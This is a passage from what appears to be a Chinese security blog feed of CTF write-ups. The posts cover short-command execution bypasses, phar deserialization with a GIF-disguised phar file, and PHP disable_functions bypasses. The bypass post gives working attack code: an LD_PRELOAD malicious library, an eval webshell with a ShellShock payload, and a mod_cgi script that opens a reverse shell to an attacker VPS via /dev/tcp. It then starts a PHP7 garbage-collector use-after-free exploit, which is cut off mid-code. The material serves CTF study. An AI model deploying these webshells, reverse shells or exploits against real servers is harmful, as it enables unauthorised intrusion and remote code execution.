class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"hack!!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只存在s开头的和z开头的文件，Linux中文件排序按照26个英文字母顺序排放，所以我们依然利用前几种字符限制的方法，通过&gt;写入一个以命令名命名的文件，如:nl（读取文件带上行）od（八进制显示输出），但这样的命令前提是其第一个字母必须在当前文件名中排到第一位。</p><p>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?1=&gt;nl ?1=*或?1=*&gt;z </span><br><span class="line">?1=&gt;od ?1=*</span><br></pre></td></tr></table></figure><p>上图是传入nl后ls当前目录下的内容，接下来再传入<code>?=*</code>的时候就会在源代码中得到flag。<br>参考文章：</p><p><a href="http://purplet.top/2020/12/28/%E6%9C%89%E9%99%90%E5%AD%97%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">CTF相关知识点<br>有限字符下的任意命令执行总结</a></p><p><a href="https://www.anquanke.com/post/id/87203" target="_blank" rel="noopener">【CTF 攻略】如何绕过四个字符限制getshell</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;命令执行的字符限制绕过  &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>phar反序列化学习</title>
    <link href="https://blog.cfyqy.com/article/a8d2a8d3.html"/>
    <id>https://blog.cfyqy.com/article/a8d2a8d3.html</id>
    <published>2020-12-28T15:28:03.000Z</published>
    <updated>2021-01-05T02:58:44.711Z</updated>
    
    <content type="html"><![CDATA[<p>phar反序列化就是可以在不使用php函数unserialize()的前提下，进行反序列化，从而引起的严重的php对象注入漏洞。  </p><a id="more"></a><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h2><p>四部分构成</p><ul><li>stub：phar文件标识，前面内容不限，但必须以    <code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件</li><li>manifest：压缩文件的属性等信息，以序列化的形式存储自定义的meta-data。</li><li>contents：压缩文件的内容</li><li>signature：签名，在文件末尾</li></ul><h2 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h2><p>漏洞触发点在使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化。当内核调用phar_parse_metadata()解析metadata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成反序列化漏洞。<br><img src="../../images/php/phar/1.png" alt=""></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>利用条件:</p><ul><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</li></ul><p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="../../images/php/phar/2.png" alt=""></p><h2 id="生成文件"><a href="#生成文件" class="headerlink" title="生成文件"></a>生成文件</h2><p>根据文件结构我们来自己构建一个 phar 文件，php内置了一个 Phar 类来处理相关操作</p><p>注意：要将 php.ini 中的 phar.readonly 选项设置为Off，否则无法生成 phar 文件。</p><p>phar.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $o -&gt; data=<span class="string">'hu3sky'</span>;</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成phar.phar文件<br><img src="../../images/php/phar/1.jpg" alt=""></p><p>可以明显的看到meta-data是以序列化的形式存储的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到加了GIF89a文件头，从而使其伪装成gif文件：<br><img src="../../images/php/phar/3.png" alt=""><br>生成文件后，可以修改为任意后缀。 </p><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>参考文章：</p><p>Phar反序列化浅析：<a href="https://www.extrader.top/posts/bb56c28a/" target="_blank" rel="noopener">https://www.extrader.top/posts/bb56c28a/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;phar反序列化就是可以在不使用php函数unserialize()的前提下，进行反序列化，从而引起的严重的php对象注入漏洞。  &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Bypasss Disable_function </title>
    <link href="https://blog.cfyqy.com/article/6124293c.html"/>
    <id>https://blog.cfyqy.com/article/6124293c.html</id>
    <published>2020-12-27T03:19:00.000Z</published>
    <updated>2021-01-05T02:53:25.071Z</updated>
    
    <content type="html"><![CDATA[<p>PHP 的 disable_functions 用于禁用一些危险的函数避免被攻击者利用  </p><a id="more"></a><p>disable_function专题： <a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions" target="_blank" rel="noopener">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions</a>  </p><h1 id="寻找非过滤函数"><a href="#寻找非过滤函数" class="headerlink" title="寻找非过滤函数"></a>寻找非过滤函数</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function=<span class="string">"pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv"</span></span><br><span class="line">disable_function=<span class="string">"eee,tdd"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> disable_function.split(<span class="string">","</span>):</span><br><span class="line"><span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> function:</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure><h1 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h1><blockquote><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。  </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">putenv()：PHP函数，可以设置环境变量</span><br><span class="line">mail()，error_log():PHP函数，在运行时会执行系统中的程序：sendmail</span><br></pre></td></tr></table></figure><p>大致步骤：</p><ul><li>生成一个我们的恶意动态链接库文件</li><li>利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径</li><li>配合php的某个函数去触发我们的恶意动态链接库文件</li><li>RCE并获取flag</li></ul><p>getflag.c</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"/readflag &gt; /tmp/flag.txt"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成getflag.so</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC getflag.c -o getflag.so</span><br></pre></td></tr></table></figure><p>上传到tmp目录下，</p><p>在网站根目录创建shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?Php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=/tmp/getflag.so"</span>);</span><br><span class="line">mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">error_log(<span class="string">""</span>,<span class="number">1</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后去GET请求包含shell.php url/?ant=include(%27shell.php%27);<br>在tmp目录上生成flag.txt，包含flag，蚁剑记得重新刷新一下目录</p><h1 id="ShellShock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h1><p>ShellShock,破壳漏洞，出现于2014年<br>利用bash破壳漏洞（CVE-2014-6271），该漏洞存在于bash 1.14 – 4.3版本中<br><a href="https://www.cnblogs.com/qmfsun/p/7591757.html" target="_blank" rel="noopener">https://www.cnblogs.com/qmfsun/p/7591757.html</a><br>可以通过以下命令来判断是否存在这个漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x=<span class="string">'() &#123; :;&#125;; echo vulnerable'</span> bash -c <span class="string">"echo this is a test"</span></span><br></pre></td></tr></table></figure><p>如果结果中有 vulnerable说明存在这个漏洞，执行了echo vulnerable这个语句。<br>大致原理：<br>bash shell中定义环境变量通过函数名称来调用时，正常情况下是这样<br>在这里插入图片描述<br><img src="../../images/ctf/ctfhub/1.png" alt=""><br>但是对于存在shellshock漏洞的环境下，Bash对于环境变量只是检测到函数，并且从’{‘开始执行，但是并没有在’}’后停止，也就是说定义在函数体外shell命令也会执行，所以<code>env x=&#39;() { :;}; echo vulnerable&#39;</code> 输出了vulnerable。</p><p>例题：<br>查看phpinfo() 和上题一样还是没有禁用error_log函数。正常情况下蚁剑已经实现通过ShellShock漏洞，直接拿到shell，但是这题不行。<br>上传shell.php，并访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  @<span class="keyword">eval</span>($_REQUEST[<span class="string">'ant'</span>]);</span><br><span class="line">  putenv(<span class="string">"PHP_test=() &#123; :; &#125;; tac /flag &gt;&gt; /var/www/html/flag.txt"</span>);</span><br><span class="line">  error_log(<span class="string">"admin"</span>,<span class="number">1</span>);</span><br><span class="line">  <span class="comment">//mail("admin@localhost","","","","");</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过putenv来设置环境变量，默认putenv定义的环境变量名必须以<code>PHP_</code>开头。<br>error_log()函数会在执行<code>sh -c -t -i</code>触发payload</p><h1 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h1><p>需要满足几个条件:</p><ul><li>必须是apache环境</li><li>mod_cgi已经启用</li><li>必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none</li><li>必须有权限写.htaccess文件</li></ul><p>例：<br>.htaccess内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .<span class="built_in">test</span><span class="comment">#表示.stest后缀的文件都会被当作cgi脚本执行</span></span><br></pre></td></tr></table></figure><p>shell.test</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> -ne <span class="string">"Content-Type: text/html\n\n"</span></span><br><span class="line"><span class="built_in">echo</span>&amp;ls</span><br></pre></td></tr></table></figure><p>这里没尝试成功,猜测要给shell.test给777权限</p><p>注解：</p><blockquote><p>Options指令是Apache配置文件中一个比较常见也比较重要的指令，Options指令可以在Apache服务器核心配置(server config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用。Options指令的主要作用是控制特定目录将启用哪些服务器特性。<br>关于Options指令后可以附加的特性选项的具体作用及含义，可以参考这篇文章：<a href="http://www.365mini.com/page/apache-options-directive.htm" target="_blank" rel="noopener">http://www.365mini.com/page/apache-options-directive.htm</a><br>当然我们用到的就是ExecCGI选项，表示允许使用mod_cgi模块执行CGI脚本</p></blockquote><p>上传shell.php，vps监听端口，访问shell.php,反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">"bash -i &gt;&amp; /dev/tcp/vpsip/port 0&gt;&amp;1"</span>; <span class="comment">//command to be executed</span></span><br><span class="line">$shellfile = <span class="string">"#!/bin/bash\n"</span>; <span class="comment">//using a shellscript</span></span><br><span class="line">$shellfile .= <span class="string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span>; <span class="comment">//header is needed, otherwise a 500 error is thrown when there is output</span></span><br><span class="line">$shellfile .= <span class="string">"$cmd"</span>; <span class="comment">//executing $cmd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkEnabled</span><span class="params">($text,$condition,$yes,$no)</span> //<span class="title">this</span> <span class="title">surely</span> <span class="title">can</span> <span class="title">be</span> <span class="title">shorter</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$text: "</span> . ($condition ? $yes : $no) . <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'checked'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    @file_put_contents(<span class="string">'.htaccess'</span>, <span class="string">"\nSetEnv HTACCESS on"</span>, FILE_APPEND); <span class="comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span></span><br><span class="line">    header(<span class="string">'Location: '</span> . $_SERVER[<span class="string">'PHP_SELF'</span>] . <span class="string">'?checked=true'</span>); <span class="comment">//execute the script again to see if the htaccess test worked</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $modcgi = in_array(<span class="string">'mod_cgi'</span>, apache_get_modules()); <span class="comment">// mod_cgi enabled?</span></span><br><span class="line">    $writable = is_writable(<span class="string">'.'</span>); <span class="comment">//current dir writable?</span></span><br><span class="line">    $htaccess = !<span class="keyword">empty</span>($_SERVER[<span class="string">'HTACCESS'</span>]); <span class="comment">//htaccess enabled?</span></span><br><span class="line">        checkEnabled(<span class="string">"Mod-Cgi enabled"</span>,$modcgi,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">        checkEnabled(<span class="string">"Is writable"</span>,$writable,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">        checkEnabled(<span class="string">"htaccess working"</span>,$htaccess,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error. All of the above must be true for the script to work!"</span>; <span class="comment">//abort if not</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        checkEnabled(<span class="string">"Backing up .htaccess"</span>,copy(<span class="string">".htaccess"</span>,<span class="string">".htaccess.bak"</span>),<span class="string">"Suceeded! Saved in .htaccess.bak"</span>,<span class="string">"Failed!"</span>); <span class="comment">//make a backup, cause you never know.</span></span><br><span class="line">        checkEnabled(<span class="string">"Write .htaccess file"</span>,file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"Options +ExecCGI\nAddHandler cgi-script .dizzle"</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>); <span class="comment">//.dizzle is a nice extension</span></span><br><span class="line">        checkEnabled(<span class="string">"Write shell file"</span>,file_put_contents(<span class="string">'shell.dizzle'</span>,$shellfile),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>); <span class="comment">//write the file</span></span><br><span class="line">        checkEnabled(<span class="string">"Chmod 777"</span>,chmod(<span class="string">"shell.dizzle"</span>,<span class="number">0777</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>); <span class="comment">//rwx</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'&gt;"</span>; <span class="comment">//call the script</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h1><p>详情可看此篇文章：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a> </p><p>可用蚁剑 disable_functions 插件绕过<br><img src="../../images/ctf/ctfhub/2.jpg" alt=""><br>会生成 .antproxy.php 文件，密码ant<br><img src="../../images/ctf/ctfhub/3.jpg" alt=""><br>连接 .antproxy.php 文件<br><img src="../../images/ctf/ctfhub/4.jpg" alt=""></p><h1 id="GC-UAF"><a href="#GC-UAF" class="headerlink" title="GC UAF"></a>GC UAF</h1><p>利用的是PHP garbage collector程序中的堆溢出触发，影响范围为7.0-1.3  </p><p>使用条件：<br>Linux 操作系统<br>PHP 版本<br>7.0 - all versions to date<br>7.1 - all versions to date<br>7.2 - all versions to date<br>7.3 - all versions to date   </p><p>exp:<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a><br>或者直接蚁剑<br><img src="../../images/ctf/ctfhub/5.jpg" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn($_POST[<span class="string">"pass"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + 